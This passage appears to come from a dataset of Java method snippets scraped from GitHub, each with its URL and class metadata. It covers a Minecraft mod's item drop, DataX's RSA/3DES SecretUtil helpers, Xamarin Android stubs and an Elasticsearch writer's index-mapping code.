entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(HelianthusBlock.block, (int) (1)));\t\t\tentityToSpawn.setPickupDelay(10);\t\t\tworld.addEntity(entityToSpawn);\t\t}\t\tif (!world.isRemote) {\t\t\tItemEntity entityToSpawn = new ItemEntity(world, x, y, z, new ItemStack(Items.FLOWER_POT, (int) (1)));\t\t\tentityToSpawn.setPickupDelay(10);\t\t\tworld.addEntity(entityToSpawn);\t\t}\t}", "url": "https://raw.githubusercontent.com/KarogathModdingStudios/Enhanced-Vanilla-1.15/master/src/main/java/com/karogath/enhancedvanilla/procedures/SunflowerExplosionProcedure.java", "stars": "2", "class": {"name": "SunflowerExplosionProcedure", "extends": "EnhancedVanillaElements", "implements": null, "modifiers": ["public"]}}, {"method_name": "encryptBASE64", "params": ["byte"], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String encryptBASE64(byte[] plaintextBytes) throws Exception {        return new String(base64.encode(plaintextBytes), ENCODING);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decryptBASE64", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "byte", "snippet": "    public static byte[] decryptBASE64(String cipherText) {        return base64.decode(cipherText);    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encrypt", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String encrypt(String data, String key, String method) {        if (SecretUtil.KEY_ALGORITHM_RSA.equals(method)) {            return SecretUtil.encryptRSA(data, key);        } else if (SecretUtil.KEY_ALGORITHM_3DES.equals(method)) {            return SecretUtil.encrypt3DES(data, key);        } else {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR,                    String.format(\"\u7cfb\u7edf\u7f16\u7a0b\u9519\u8bef,\u4e0d\u652f\u6301\u7684\u52a0\u5bc6\u7c7b\u578b\", method));        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decrypt", "params": ["String", "String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String decrypt(String data, String key, String method) {        if (SecretUtil.KEY_ALGORITHM_RSA.equals(method)) {            return SecretUtil.decryptRSA(data, key);        } else if (SecretUtil.KEY_ALGORITHM_3DES.equals(method)) {            return SecretUtil.decrypt3DES(data, key);        } else {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR,                    String.format(\"\u7cfb\u7edf\u7f16\u7a0b\u9519\u8bef,\u4e0d\u652f\u6301\u7684\u52a0\u5bc6\u7c7b\u578b\", method));        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encryptRSA", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String encryptRSA(String data, String key) {        try {            // \u5bf9\u516c\u94a5\u89e3\u5bc6\uff0c\u516c\u94a5\u88abbase64\u52a0\u5bc6\u8fc7            byte[] keyBytes = decryptBASE64(key);            // \u53d6\u5f97\u516c\u94a5            X509EncodedKeySpec x509KeySpec = new X509EncodedKeySpec(keyBytes);            KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM_RSA);            Key publicKey = keyFactory.generatePublic(x509KeySpec);            // \u5bf9\u6570\u636e\u52a0\u5bc6            Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());            cipher.init(Cipher.ENCRYPT_MODE, publicKey);            return encryptBASE64(cipher.doFinal(data.getBytes(ENCODING)));        } catch (Exception e) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR, \"rsa\u52a0\u5bc6\u51fa\u9519\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decryptRSA", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String decryptRSA(String data, String key) {        try {            // \u5bf9\u5bc6\u94a5\u89e3\u5bc6            byte[] keyBytes = decryptBASE64(key);            // \u53d6\u5f97\u79c1\u94a5            PKCS8EncodedKeySpec pkcs8KeySpec = new PKCS8EncodedKeySpec(keyBytes);            KeyFactory keyFactory = KeyFactory.getInstance(KEY_ALGORITHM_RSA);            Key privateKey = keyFactory.generatePrivate(pkcs8KeySpec);            // \u5bf9\u6570\u636e\u89e3\u5bc6            Cipher cipher = Cipher.getInstance(keyFactory.getAlgorithm());            cipher.init(Cipher.DECRYPT_MODE, privateKey);            return new String(cipher.doFinal(decryptBASE64(data)), ENCODING);        } catch (Exception e) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR, \"rsa\u89e3\u5bc6\u51fa\u9519\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "initKey", "params": [], "throws": ["Exception"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String[] initKey() throws Exception {        KeyPairGenerator keyPairGen = KeyPairGenerator                .getInstance(KEY_ALGORITHM_RSA);        keyPairGen.initialize(1024);        KeyPair keyPair = keyPairGen.generateKeyPair();        // \u516c\u94a5        RSAPublicKey publicKey = (RSAPublicKey) keyPair.getPublic();        // \u79c1\u94a5        RSAPrivateKey privateKey = (RSAPrivateKey) keyPair.getPrivate();        String[] publicAndPrivateKey = {                encryptBASE64(publicKey.getEncoded()),                encryptBASE64(privateKey.getEncoded())};        return publicAndPrivateKey;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encrypt3DES", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String encrypt3DES(String data, String key) {        try {            // \u751f\u6210\u5bc6\u94a5            SecretKey desKey = new SecretKeySpec(build3DesKey(key),                    KEY_ALGORITHM_3DES);            // \u5bf9\u6570\u636e\u52a0\u5bc6            Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM_3DES);            cipher.init(Cipher.ENCRYPT_MODE, desKey);            return encryptBASE64(cipher.doFinal(data.getBytes(ENCODING)));        } catch (Exception e) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR, \"3\u91cdDES\u52a0\u5bc6\u51fa\u9519\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decrypt3DES", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String decrypt3DES(String data, String key) {        try {            // \u751f\u6210\u5bc6\u94a5            SecretKey desKey = new SecretKeySpec(build3DesKey(key),                    KEY_ALGORITHM_3DES);            // \u5bf9\u6570\u636e\u89e3\u5bc6            Cipher cipher = Cipher.getInstance(CIPHER_ALGORITHM_3DES);            cipher.init(Cipher.DECRYPT_MODE, desKey);            return new String(cipher.doFinal(decryptBASE64(data)), ENCODING);        } catch (Exception e) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR, \"rsa\u89e3\u5bc6\u51fa\u9519\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "build3DesKey", "params": ["String"], "throws": null, "modifiers": ["private", "static"], "return_type": "byte", "snippet": "    private static byte[] build3DesKey(String keyStr) {        try {            // \u58f0\u660e\u4e00\u4e2a24\u4f4d\u7684\u5b57\u8282\u6570\u7ec4\uff0c\u9ed8\u8ba4\u91cc\u9762\u90fd\u662f0\uff0cwarn: \u5b57\u7b26\u4e320(48)\u548c\u6570\u7ec4\u9ed8\u8ba4\u503c0\u4e0d\u4e00\u6837\uff0c\u7edf\u4e00\u5b57\u7b26\u4e320(48)            byte[] key = \"000000000000000000000000\".getBytes(ENCODING);            byte[] temp = keyStr.getBytes(ENCODING);            if (key.length > temp.length) {                // \u5982\u679ctemp\u4e0d\u591f24\u4f4d\uff0c\u5219\u62f7\u8d1dtemp\u6570\u7ec4\u6574\u4e2a\u957f\u5ea6\u7684\u5185\u5bb9\u5230key\u6570\u7ec4\u4e2d                System.arraycopy(temp, 0, key, 0, temp.length);            } else {                // \u5982\u679ctemp\u5927\u4e8e24\u4f4d\uff0c\u5219\u62f7\u8d1dtemp\u6570\u7ec424\u4e2a\u957f\u5ea6\u7684\u5185\u5bb9\u5230key\u6570\u7ec4\u4e2d                System.arraycopy(temp, 0, key, 0, key.length);            }            return key;        } catch (Exception e) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR, \"\u6784\u5efa\u4e09\u91cdDES\u5bc6\u5319\u51fa\u9519\", e);        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSecurityProperties", "params": [], "throws": null, "modifiers": ["synchronized", "public", "static"], "return_type": "Properties", "snippet": "    public static synchronized Properties getSecurityProperties() {        if (properties == null) {            InputStream secretStream = null;            try {                secretStream = new FileInputStream(                        CoreConstant.DATAX_SECRET_PATH);            } catch (FileNotFoundException e) {                throw DataXException.asDataXException(                        FrameworkErrorCode.SECRET_ERROR,                        \"DataX\u914d\u7f6e\u8981\u6c42\u52a0\u89e3\u5bc6\uff0c\u4f46\u65e0\u6cd5\u627e\u5230\u5bc6\u94a5\u7684\u914d\u7f6e\u6587\u4ef6\");            }            properties = new Properties();            try {                properties.load(secretStream);                secretStream.close();            } catch (IOException e) {                throw DataXException.asDataXException(                        FrameworkErrorCode.SECRET_ERROR, \"\u8bfb\u53d6\u52a0\u89e3\u5bc6\u914d\u7f6e\u6587\u4ef6\u51fa\u9519\", e);            }        }        return properties;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "encryptSecretKey", "params": ["Configuration"], "throws": null, "modifiers": ["public", "static"], "return_type": "Configuration", "snippet": "    public static Configuration encryptSecretKey(Configuration configuration) {        String keyVersion = configuration                .getString(CoreConstant.DATAX_JOB_SETTING_KEYVERSION);        // \u6ca1\u6709\u8bbe\u7f6ekeyVersion\uff0c\u8868\u793a\u4e0d\u7528\u89e3\u5bc6        if (StringUtils.isBlank(keyVersion)) {            return configuration;        }        Map<String, Triple<String, String, String>> versionKeyMap = getPrivateKeyMap();        if (null == versionKeyMap.get(keyVersion)) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR,                    String.format(\"DataX\u914d\u7f6e\u7684\u5bc6\u94a5\u7248\u672c\u4e3a[%s]\uff0c\u4f46\u5728\u7cfb\u7edf\u4e2d\u6ca1\u6709\u914d\u7f6e\uff0c\u4efb\u52a1\u5bc6\u94a5\u914d\u7f6e\u9519\u8bef\uff0c\u4e0d\u5b58\u5728\u60a8\u914d\u7f6e\u7684\u5bc6\u94a5\u7248\u672c\", keyVersion));        }        String key = versionKeyMap.get(keyVersion).getRight();        String method = versionKeyMap.get(keyVersion).getMiddle();        // keyVersion\u8981\u6c42\u7684\u79c1\u94a5\u6ca1\u6709\u914d\u7f6e        if (StringUtils.isBlank(key)) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR,                    String.format(\"DataX\u914d\u7f6e\u7684\u5bc6\u94a5\u7248\u672c\u4e3a[%s]\uff0c\u4f46\u5728\u7cfb\u7edf\u4e2d\u6ca1\u6709\u914d\u7f6e\uff0c\u53ef\u80fd\u662f\u4efb\u52a1\u5bc6\u94a5\u914d\u7f6e\u9519\u8bef\uff0c\u4e5f\u53ef\u80fd\u662f\u7cfb\u7edf\u7ef4\u62a4\u95ee\u9898\", keyVersion));        }        String tempEncrptedData = null;        for (String path : configuration.getSecretKeyPathSet()) {            tempEncrptedData = SecretUtil.encrypt(configuration.getString(path), key, method);            int lastPathIndex = path.lastIndexOf(\".\") + 1;            String lastPathKey = path.substring(lastPathIndex);            String newPath = path.substring(0, lastPathIndex) + \"*\"                    + lastPathKey;            configuration.set(newPath, tempEncrptedData);            configuration.remove(path);        }        return configuration;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "decryptSecretKey", "params": ["Configuration"], "throws": null, "modifiers": ["public", "static"], "return_type": "Configuration", "snippet": "    public static Configuration decryptSecretKey(Configuration config) {        String keyVersion = config                .getString(CoreConstant.DATAX_JOB_SETTING_KEYVERSION);        // \u6ca1\u6709\u8bbe\u7f6ekeyVersion\uff0c\u8868\u793a\u4e0d\u7528\u89e3\u5bc6        if (StringUtils.isBlank(keyVersion)) {            return config;        }        Map<String, Triple<String, String, String>> versionKeyMap = getPrivateKeyMap();        if (null == versionKeyMap.get(keyVersion)) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR,                    String.format(\"DataX\u914d\u7f6e\u7684\u5bc6\u94a5\u7248\u672c\u4e3a[%s]\uff0c\u4f46\u5728\u7cfb\u7edf\u4e2d\u6ca1\u6709\u914d\u7f6e\uff0c\u4efb\u52a1\u5bc6\u94a5\u914d\u7f6e\u9519\u8bef\uff0c\u4e0d\u5b58\u5728\u60a8\u914d\u7f6e\u7684\u5bc6\u94a5\u7248\u672c\", keyVersion));        }        String decryptKey = versionKeyMap.get(keyVersion).getLeft();        String method = versionKeyMap.get(keyVersion).getMiddle();        // keyVersion\u8981\u6c42\u7684\u79c1\u94a5\u6ca1\u6709\u914d\u7f6e        if (StringUtils.isBlank(decryptKey)) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR,                    String.format(\"DataX\u914d\u7f6e\u7684\u5bc6\u94a5\u7248\u672c\u4e3a[%s]\uff0c\u4f46\u5728\u7cfb\u7edf\u4e2d\u6ca1\u6709\u914d\u7f6e\uff0c\u53ef\u80fd\u662f\u4efb\u52a1\u5bc6\u94a5\u914d\u7f6e\u9519\u8bef\uff0c\u4e5f\u53ef\u80fd\u662f\u7cfb\u7edf\u7ef4\u62a4\u95ee\u9898\", keyVersion));        }        // \u5bf9\u5305\u542b*\u53f7key\u89e3\u5bc6\u5904\u7406        for (String key : config.getKeys()) {            int lastPathIndex = key.lastIndexOf(\".\") + 1;            String lastPathKey = key.substring(lastPathIndex);            if (lastPathKey.length() > 1 && lastPathKey.charAt(0) == '*'                    && lastPathKey.charAt(1) != '*') {                Object value = config.get(key);                if (value instanceof String) {                    String newKey = key.substring(0, lastPathIndex)                            + lastPathKey.substring(1);                    config.set(newKey,                            SecretUtil.decrypt((String) value, decryptKey, method));                    config.addSecretKeyPath(newKey);                    config.remove(key);                }            }        }        return config;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getPrivateKeyMap", "params": [], "throws": null, "modifiers": ["synchronized", "private", "static"], "return_type": "Map<String,Triple>", "snippet": "    private static synchronized Map<String, Triple<String, String, String>> getPrivateKeyMap() {        if (versionKeyMap == null) {            versionKeyMap = new HashMap<String, Triple<String, String, String>>();            Properties properties = SecretUtil.getSecurityProperties();            String[] serviceUsernames = new String[]{                    CoreConstant.LAST_SERVICE_USERNAME,                    CoreConstant.CURRENT_SERVICE_USERNAME};            String[] servicePasswords = new String[]{                    CoreConstant.LAST_SERVICE_PASSWORD,                    CoreConstant.CURRENT_SERVICE_PASSWORD};            for (int i = 0; i < serviceUsernames.length; i++) {                String serviceUsername = properties                        .getProperty(serviceUsernames[i]);                if (StringUtils.isNotBlank(serviceUsername)) {                    String servicePassword = properties                            .getProperty(servicePasswords[i]);                    if (StringUtils.isNotBlank(servicePassword)) {                        versionKeyMap.put(serviceUsername, ImmutableTriple.of(                                servicePassword, SecretUtil.KEY_ALGORITHM_3DES,                                servicePassword));                    } else {                        throw DataXException.asDataXException(                                FrameworkErrorCode.SECRET_ERROR, String.format(                                        \"DataX\u914d\u7f6e\u8981\u6c42\u52a0\u89e3\u5bc6\uff0c\u4f46\u914d\u7f6e\u7684\u5bc6\u94a5\u7248\u672c[%s]\u5b58\u5728\u5bc6\u94a5\u4e3a\u7a7a\u7684\u60c5\u51b5\",                                        serviceUsername));                    }                }            }            String[] keyVersions = new String[]{CoreConstant.LAST_KEYVERSION,                    CoreConstant.CURRENT_KEYVERSION};            String[] privateKeys = new String[]{CoreConstant.LAST_PRIVATEKEY,                    CoreConstant.CURRENT_PRIVATEKEY};            String[] publicKeys = new String[]{CoreConstant.LAST_PUBLICKEY,                    CoreConstant.CURRENT_PUBLICKEY};            for (int i = 0; i < keyVersions.length; i++) {                String keyVersion = properties.getProperty(keyVersions[i]);                if (StringUtils.isNotBlank(keyVersion)) {                    String privateKey = properties.getProperty(privateKeys[i]);                    String publicKey = properties.getProperty(publicKeys[i]);                    if (StringUtils.isNotBlank(privateKey)                            && StringUtils.isNotBlank(publicKey)) {                        versionKeyMap.put(keyVersion, ImmutableTriple.of(                                privateKey, SecretUtil.KEY_ALGORITHM_RSA,                                publicKey));                    } else {                        throw DataXException.asDataXException(                                FrameworkErrorCode.SECRET_ERROR, String.format(                                        \"DataX\u914d\u7f6e\u8981\u6c42\u52a0\u89e3\u5bc6\uff0c\u4f46\u914d\u7f6e\u7684\u516c\u79c1\u94a5\u5bf9\u5b58\u5728\u4e3a\u7a7a\u7684\u60c5\u51b5\uff0c\u7248\u672c[%s]\",                                        keyVersion));                    }                }            }        }        if (versionKeyMap.size() <= 0) {            throw DataXException.asDataXException(                    FrameworkErrorCode.SECRET_ERROR, \"DataX\u914d\u7f6e\u8981\u6c42\u52a0\u89e3\u5bc6\uff0c\u4f46\u65e0\u6cd5\u627e\u5230\u52a0\u89e3\u5bc6\u914d\u7f6e\");        }        return versionKeyMap;    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/util/SecretUtil.java", "stars": "23", "class": {"name": "SecretUtil", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_onTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/BoxRenderer.java", "stars": "2", "class": {"name": "BoxRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onTouchEvent", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onTouchEvent (android.view.MotionEvent p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/BoxRenderer.java", "stars": "2", "class": {"name": "BoxRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/BoxRenderer.java", "stars": "2", "class": {"name": "BoxRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/BoxRenderer.java", "stars": "2", "class": {"name": "BoxRenderer", "extends": "crc643f46942d9dd1fff9", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onClick (android.view.View p0)\t{\t\tn_onClick (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PickerManager_PickerListener.java", "stars": "2", "class": {"name": "PickerManager_PickerListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onClick", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onClick (android.view.View p0);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PickerManager_PickerListener.java", "stars": "2", "class": {"name": "PickerManager_PickerListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PickerManager_PickerListener.java", "stars": "2", "class": {"name": "PickerManager_PickerListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PickerManager_PickerListener.java", "stars": "2", "class": {"name": "PickerManager_PickerListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void init() {            this.conf = super.getPluginJobConf();        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Job", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "prepare", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "        public void prepare() {            /**             * \u6ce8\u610f\uff1a\u6b64\u65b9\u6cd5\u4ec5\u6267\u884c\u4e00\u6b21\u3002             * \u6700\u4f73\u5b9e\u8df5\uff1a\u5982\u679c Job \u4e2d\u6709\u9700\u8981\u8fdb\u884c\u6570\u636e\u540c\u6b65\u4e4b\u524d\u7684\u5904\u7406\uff0c\u53ef\u4ee5\u5728\u6b64\u5904\u5b8c\u6210\uff0c\u5982\u679c\u6ca1\u6709\u5fc5\u8981\u5219\u53ef\u4ee5\u76f4\u63a5\u53bb\u6389\u3002             */            ESClient esClient = new ESClient();            esClient.createClient(Key.getEndpoint(conf),                    Key.getAccessID(conf),                    Key.getAccessKey(conf),                    false,                    300000,                    false,                    false);            String indexName = Key.getIndexName(conf);            String typeName = Key.getTypeName(conf);            boolean dynamic = Key.getDynamic(conf);            String mappings = genMappings(typeName);            String settings = JSONObject.toJSONString(                    Key.getSettings(conf)            );            log.info(String.format(\"index:[%s], type:[%s], mappings:[%s]\", indexName, typeName, mappings));            try {                boolean isIndicesExists = esClient.indicesExists(indexName);                if (Key.isCleanup(this.conf) && isIndicesExists) {                    esClient.deleteIndex(indexName);                }                // \u5f3a\u5236\u521b\u5efa,\u5185\u90e8\u81ea\u52a8\u5ffd\u7565\u5df2\u5b58\u5728\u7684\u60c5\u51b5                if (!esClient.createIndex(indexName, typeName, mappings, settings, dynamic)) {                    throw new IOException(\"create index or mapping failed\");                }            } catch (Exception ex) {                throw DataXException.asDataXException(ESWriterErrorCode.ES_MAPPINGS, ex.toString());            }            esClient.closeJestClient();        }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-elasticsearchwriter/src/main/java/com/alibaba/datax/plugin/writer/elasticsearchwriter/ESWriter.java", "stars": "23", "class": {"name": "Job", "extends": "Writer", "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "genMappings", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "        private String genMappings(String typeName) {            String mappings = null;            Map<String, Object> propMap = new HashMap<String, Object>();            List<ESColumn> columnList = new ArrayList<ESColumn>();            List column = conf.getList(\"column\");            if (column != null) {                for (Object col : column) {                    JSONObject jo = JSONObject.parseObject(col.toString());                    String colName = jo.getString(\"name\");                    String colTypeStr = jo.getString(\"type\");                    if (colTypeStr == null) {                        throw DataXException.asDataXException(ESWriterErrorCode.BAD_CONFIG_VALUE, col.toString() + \" column must have type\");                    }                    ESFieldType colType = ESFieldType.getESFieldType(colTypeStr);                    if (colType == null) {                        throw DataXException.asDataXException(ESWriterErrorCode.BAD_CONFIG_VALUE, col.toString() + \" unsupported type\");                    }                    ESColumn columnItem = new ESColumn();                    if (colName.equals(Key.PRIMARY_KEY_COLUMN_NAME)) {                        // \u517c\u5bb9\u5df2\u6709\u7248\u672c                        colType = ESFieldType.ID;                        colTypeStr = \"id\";                    }                    columnItem.setName(colName);                    columnItem.setType(colTypeStr);                    if (colType == ESFieldType.ID) {                        columnList.add(columnItem);                        // \u5982\u679c\u662fid,\u5219properties\u4e3a\u7a7a                        continue;                    }                    Boolean array = jo.getBoolean(\"array\");                    if (array != null) {                        columnItem.setArray(array);                    }                    Map<String, Object> field = new HashMap<String, Object>();                    field.put(\"type\", colTypeStr);                    //https://www.elastic.co/guide/en/elasticsearch/reference/5.2/breaking_50_mapping_changes.html#_literal_index_literal_property                    // https://www.elastic.co/guide/en/elasticsearch/guide/2.x/_deep_dive_on_doc_values.html#_disabling_doc_values                    field.put(\"doc_values\", jo.getBoolean(\"doc_values\"));                    field.put(\"ignore_above\", jo.getInteger(\"ignore_above\"));                    field.put(\"index\", jo.getBoolean(\"index\"));                    switch (colType) {                        case STRING:                            // \u517c\u5bb9string\u7c7b\u578b,ES5\u4e4b\u524d\u7248\u672c                            break;                        case KEYWORD:                            // https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-search-speed.html#_warm_up_global_ordinals                            field.put(\"eager_global_ordinals\", jo.getBoolean(\"eager_global_ordinals\"));                        case TEXT:                            field.put(\"analyzer\", jo.getString(\"analyzer\"));                            // \u4f18\u5316disk\u4f7f\u7528,\u4e5f\u540c\u6b65\u4f1a\u63d0\u9ad8index\u6027\u80fd                            // https://www.elastic.co/guide/en/elasticsearch/reference/current/tune-for-disk-usage.html                            field.put(\"norms\", jo.getBoolean(\"norms\"));                            field.put(\"index_options\", jo.getBoolean(\"index_options\"));                            break;                        case DATE:                            columnItem.setTimeZone(jo.getString(\"timezone\"));                            columnItem.setFormat(jo.getString(\"format\"));                            // 